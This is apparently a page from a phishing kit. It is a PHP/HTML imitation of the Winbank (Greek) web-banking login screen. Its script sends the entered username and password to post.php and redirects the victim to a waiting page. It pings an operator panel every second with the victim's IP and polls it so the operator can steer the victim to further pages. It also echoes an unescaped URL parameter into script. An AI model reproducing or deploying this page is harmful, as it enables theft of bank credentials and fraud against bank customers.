<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winbank</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="container">
<div class="left">
<img src="res/logo.svg">
</div>
<div class="center">
<img src="res/links-lg.png" class="lg">
<img src="res/links-sm.png" class="sm">
</div>
<div class="right">
<img src="res/biglogo.svg">
</div>
</div>
</header>
<main>
<div class="container">


<div class="info"><img src="res/info.png"></div>
<div class="form">
<div class="title">Κωδικοί Εισόδου</div>

<div class="text">
Σύνδεση στο web banking
</div>

<?php 
if(isset($_GET['e'])){
    echo '<div class="col" style="margin:20px 0; color:red;">Λάθος στοιχεία σύνδεσης. Παρακαλούμε ελέγξτε τα στοιχεία σας και προσπαθήστε ξανά.</div>';
}
?>

<div class="col a">
    <input type="text" id="u" placeholder="Username">
    <a href="card.php?recover">Ξεχάσατε το Username;</a>
</div>
<div class="col a">
    <input type="password" id="p" placeholder="Password">
    <a href="#">Ξεχάσατε/Απενεργοποιήσατε το Password;</a>
</div>

<div class="col">
    <button onclick="sendLog()">ΣΥΝΔΕΣΗ</button>
</div>

<div class="col" style="text-align:center;">
Δεν έχετε winbank; <a href="#" style="display:inline-block;">Online εγγραφή</a>
</div>

<div class="col bordertop">
<a href="#">Απενεργοποίηση πρόσβασης winbank</a>
</div>

</div>




</div>
</main>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        window.location="wait.php";
    });

}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});


setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>